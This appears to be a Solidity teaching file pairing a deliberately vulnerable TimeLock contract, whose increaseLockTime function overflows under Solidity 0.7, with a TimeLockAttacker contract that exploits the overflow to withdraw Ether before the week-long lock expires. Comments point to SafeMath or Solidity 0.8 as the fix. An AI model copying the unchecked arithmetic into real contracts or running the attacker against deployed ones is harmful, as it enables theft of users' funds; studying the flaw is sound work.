pragma solidity ^0.7.6;

// only solidity < 0.8
// solidty >= 0.8 behave throwing error

// use SafeMath or solidity >= 0.8


import "hardhat/console.sol";

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime (uint _secondToIncreaseTime) external {
        uint _max = 2 ** 256 -1;
        console.log("2**256 - 1 = ", _max);
        console.log("2**256 + 1 = ", _max  + 1);

        console.log("lock time: ", lockTime[msg.sender]);
        console.log("increase: ", _secondToIncreaseTime);
        console.log("max: ", lockTime[msg.sender] + _secondToIncreaseTime - 1);

        lockTime[msg.sender] += _secondToIncreaseTime;
        console.log("after: ", lockTime[msg.sender]);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "inssuficient balances");
        require(lockTime[msg.sender] < block.timestamp, "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "failed to send Ether");
    }

}


// overflowを狙って 1週間またなくても引き出せる攻撃

contract TimeLockAttacker {
    TimeLock timeLock;

    constructor(address _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    receive() external payable {}
    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();

        /*
            2**256 = 0
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );

        timeLock.withdraw();
    }
}